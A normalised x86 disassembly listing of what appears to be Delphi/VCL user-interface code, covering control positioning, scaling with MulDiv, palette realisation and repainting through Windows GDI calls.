call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f718
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_43fa18
sub_43f738
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_40324c
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_442394
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403448
mov edx ebx
mov eax edi
call sub_41fca8
mov eax ebx
mov si 0xffd9
call sub_403448
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43f800
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_420038
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_441578
sub_43f894
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41fef4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_44037c
jmp r-xdata
xor edx edx
mov eax esi
call sub_43f738
sub_43f8d8
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403448
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_43f718
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403448
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43f980
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_441b08
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44080c
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43fa18
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_441578
mov eax ebx
mov si 0xffd0
call sub_403448
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403448
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43fa18
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_446ee8
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_43fb34
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_43fb58
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43fb80
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_43fba4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_43fbc8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43fcc3
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403448
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fcca
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41a37c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403448
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403448
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41a0dc
sub_43fcd4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44080c
mov edx edi
mov eax ebx
call sub_43fd84
mov edx edi
mov eax ebx
call sub_44161c
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43fd40
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403ff0
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_43fd84
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43fde0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43fe0c
mov edx eax
mov ecx esp
mov eax esi
call sub_418ddc
mov edx esp
mov eax ebx
call sub_440250
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43fe24
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43fdc8
mov ecx esp
mov edx esi
call sub_418ddc
mov edx esp
mov eax ebx
call sub_440250
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43fe4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43fecd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fed4
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
sub_43fedc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43ff08
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43ff34
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_45b2f0
sub_43ff64
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_441578
sub_43ffe0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_4231d8
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_4231f4
sub_4401ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_440242
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_420130
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_4403c4
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4043a8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440249
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4403f4
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_440250
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_440298
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
test esi esi
je r-xdata
mov edx ebx
call sub_443824
mov edx ebx
mov eax esi
call sub_443750
mov eax ebx
call sub_43fa18
sub_4402e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403448
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_441578
mov eax edi
mov si 0xffd0
call sub_403448
sub_44037c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4541c4
mov edx ebx
mov eax esi
call sub_41fca8
sub_4403a0
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_441578
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_441578
pop ebx
retn
sub_4403c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_440338
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_40408c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_440348
sub_4403f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440449
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4403c4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043a8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440450
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax esi
call sub_40445c
mov edx eax
mov eax ebx
call sub_4403a0
sub_440474
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_423134
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_441578
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_423134
mov [ ebx + 0x84 ] eax
sub_4405fc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4405ec
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43d594
mov eax esi
call sub_43d594
jmp r-xdata
sub_440634
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_41a294
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a128
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_41a2b4
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44080c
mov eax ebx
call sub_457240
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403448
sub_4406b4
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_440634
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_440634
jmp r-xdata
sub_4406d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44076e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440775
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
sub_440780
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_41a294
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_41a238
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43fd64
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44080c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446ee8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43fd64
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446be4
push eax
call InvalidateRect
push ebp
call sub_440780
pop ecx
test al al
je r-xdata
mov al 0x1
sub_4408a8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_457218
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_441578
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403448
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44090c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446ee8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446be4
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_4409e5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4449b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_446be4
push eax
